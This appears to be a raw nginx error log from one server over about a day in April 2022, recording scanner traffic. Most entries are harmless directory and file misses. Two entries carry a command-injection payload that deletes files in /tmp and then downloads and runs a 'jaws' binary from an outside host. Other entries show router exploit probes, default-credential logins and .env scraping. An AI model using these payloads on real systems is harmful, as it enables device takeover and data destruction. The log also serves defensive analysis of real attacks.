2022/04/13 12:29:45 [error] 22#22: *34 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: , request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
2022/04/13 13:01:28 [error] 22#22: *35 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.178.236.40, server: , request: "GET http://example.com/ HTTP/1.1", host: "example.com"
2022/04/13 13:14:00 [error] 22#22: *36 directory index of "/usr/share/nginx/html/" is forbidden, client: 93.203.191.85, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 13:14:00 [error] 22#22: *36 directory index of "/usr/share/nginx/html/" is forbidden, client: 93.203.191.85, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 13:28:32 [error] 22#22: *38 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.240.192.82, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 13:38:19 [error] 22#22: *40 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 20.228.248.29, server: , request: "HEAD /robots.txt HTTP/1.0"
2022/04/13 14:11:55 [error] 22#22: *46 directory index of "/usr/share/nginx/html/" is forbidden, client: 71.6.232.4, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 14:20:56 [error] 22#22: *47 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.206.175.179, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 14:25:35 [error] 22#22: *48 directory index of "/usr/share/nginx/html/" is forbidden, client: 89.248.165.102, server: , request: "GET / HTTP/1.0"
2022/04/13 15:03:11 [error] 22#22: *51 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 120.229.207.160, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2022/04/13 15:58:21 [error] 22#22: *53 directory index of "/usr/share/nginx/html/" is forbidden, client: 186.93.106.167, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 16:08:05 [error] 22#22: *54 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.20.34, server: , request: "GET / HTTP/1.0", host: "49.119.119.7"
2022/04/13 16:54:07 [error] 22#22: *55 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.206.128.6, server: , request: "GET / HTTP/1.0"
2022/04/13 17:10:11 [error] 22#22: *56 directory index of "/usr/share/nginx/html/" is forbidden, client: 68.66.233.59, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 17:10:11 [error] 22#22: *56 directory index of "/usr/share/nginx/html/" is forbidden, client: 68.66.233.59, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 17:56:31 [error] 22#22: *57 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.178.236.40, server: , request: "GET http://example.com/ HTTP/1.1", host: "example.com"
2022/04/13 17:58:21 [error] 22#22: *58 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.178.237.132, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 18:29:02 [error] 22#22: *59 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.137.23.207, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 18:32:48 [error] 22#22: *60 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.124.84.222, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 18:45:03 [error] 22#22: *61 directory index of "/usr/share/nginx/html/" is forbidden, client: 128.14.134.170, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 19:12:51 [error] 22#22: *62 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.50.38.174, server: , request: "GET / HTTP/1.0", host: "49.119.119.7:80"
2022/04/13 19:30:15 [error] 22#22: *63 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 86.201.74.53, server: , request: "GET /.env HTTP/1.1", host: "49.119.119.7"
2022/04/13 19:30:16 [error] 22#22: *64 directory index of "/usr/share/nginx/html/" is forbidden, client: 86.201.74.53, server: , request: "POST / HTTP/1.1", host: "49.119.119.7"
2022/04/13 19:35:59 [error] 22#22: *65 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 186.230.39.13, server: , request: "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0"
2022/04/13 20:02:51 [error] 22#22: *67 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.137.23.207, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 20:15:51 [error] 22#22: *68 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.50.42.111, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 20:15:52 [error] 22#22: *69 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.50.42.111, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/13 20:17:53 [error] 22#22: *70 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 197.57.90.252, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+23.94.50.159/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2022/04/13 20:36:36 [error] 22#22: *72 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.20.34, server: , request: "GET / HTTP/1.0", host: "49.119.119.7"
2022/04/13 20:45:22 [error] 22#22: *73 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.137.23.205, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 21:01:53 [error] 22#22: *78 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.213.96.233, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 21:09:40 [error] 22#22: *79 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.180.143.137, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 21:09:55 [error] 22#22: *80 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 112.247.171.179, server: , request: "POST /HNAP1/ HTTP/1.0", host: "49.119.119.7:80"
2022/04/13 22:23:40 [error] 22#22: *81 directory index of "/usr/share/nginx/html/" is forbidden, client: 159.223.226.0, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80", referrer: "http://49.119.119.7:80/left.html"
2022/04/13 22:45:41 [error] 22#22: *82 directory index of "/usr/share/nginx/html/" is forbidden, client: 128.14.141.34, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/13 22:47:40 [error] 22#22: *84 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 20.127.91.237, server: , request: "HEAD /robots.txt HTTP/1.0"
2022/04/13 22:57:29 [error] 22#22: *85 directory index of "/usr/share/nginx/html/" is forbidden, client: 94.102.61.10, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 00:25:39 [error] 22#22: *87 open() "/usr/share/nginx/html/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 103.99.3.92, server: , request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "49.119.119.7"
2022/04/14 01:11:17 [error] 22#22: *88 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.20.34, server: , request: "GET / HTTP/1.0", host: "49.119.119.7"
2022/04/14 01:32:28 [error] 22#22: *89 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.178.237.132, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/14 01:45:43 [error] 22#22: *90 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.235.66.238, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/14 02:13:17 [error] 22#22: *92 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 190.180.154.230, server: , request: "POST /HNAP1/ HTTP/1.0", host: "49.119.119.7:80"
2022/04/14 02:26:40 [error] 22#22: *93 open() "/usr/share/nginx/html/puhuih5/login" failed (2: No such file or directory), client: 40.72.103.145, server: , request: "GET /puhuih5/login HTTP/1.1", host: "49.119.119.7"
2022/04/14 03:19:35 [error] 22#22: *94 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.178.237.132, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/14 03:36:00 [error] 22#22: *95 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.137.23.207, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/14 03:46:20 [error] 22#22: *96 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 43.154.165.79, server: , request: "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2022/04/14 04:02:14 [error] 22#22: *98 directory index of "/usr/share/nginx/html/" is forbidden, client: 193.118.53.194, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:17:31 [error] 22#22: *103 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 20.205.157.102, server: , request: "GET /.env HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:17:37 [error] 22#22: *104 directory index of "/usr/share/nginx/html/" is forbidden, client: 20.205.157.102, server: , request: "POST / HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:18:20 [error] 22#22: *105 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.137.23.205, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:21:01 [error] 22#22: *106 directory index of "/usr/share/nginx/html/" is forbidden, client: 74.82.47.2, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:30:33 [error] 22#22: *107 directory index of "/usr/share/nginx/html/" is forbidden, client: 40.72.103.145, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 05:42:31 [error] 22#22: *108 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.20.34, server: , request: "GET / HTTP/1.0", host: "49.119.119.7"
2022/04/14 06:40:18 [error] 22#22: *110 directory index of "/usr/share/nginx/html/" is forbidden, client: 130.211.54.158, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 07:29:05 [error] 22#22: *111 directory index of "/usr/share/nginx/html/" is forbidden, client: 192.241.225.89, server: , request: "GET / HTTP/1.1", host: "49.119.119.7"
2022/04/14 07:35:46 [error] 22#22: *112 open() "/usr/share/nginx/html/api/crud/test/tests" failed (2: No such file or directory), client: 116.21.12.78, server: , request: "GET /api/crud/test/tests?records%5B0%5D.extra.innerMap=%7B%7D HTTP/1.1", host: "api.dev.smallsaas.cn", referrer: "http://api.dev.smallsaas.cn:8001/"
2022/04/14 07:35:53 [error] 22#22: *113 open() "/usr/share/nginx/html/api/crud/test/tests" failed (2: No such file or directory), client: 116.21.12.78, server: , request: "GET /api/crud/test/tests?records%5B0%5D.extra.innerMap=%7B%7D HTTP/1.1", host: "api.dev.smallsaas.cn", referrer: "http://api.dev.smallsaas.cn:8001/"
2022/04/14 07:45:09 [error] 22#22: *114 directory index of "/usr/share/nginx/html/" is forbidden, client: 147.182.255.250, server: , request: "GET / HTTP/1.1", host: "49.119.119.7:80"
2022/04/14 08:33:19 [error] 22#22: *135 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.73.119.221, server: , request: "GET /favicon.ico HTTP/1.1", host: "49.119.119.7"
2022/04/14 08:33:23 [error] 22#22: *137 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.73.119.221, server: , request: "GET /favicon.ico HTTP/1.1", host: "49.119.119.7"
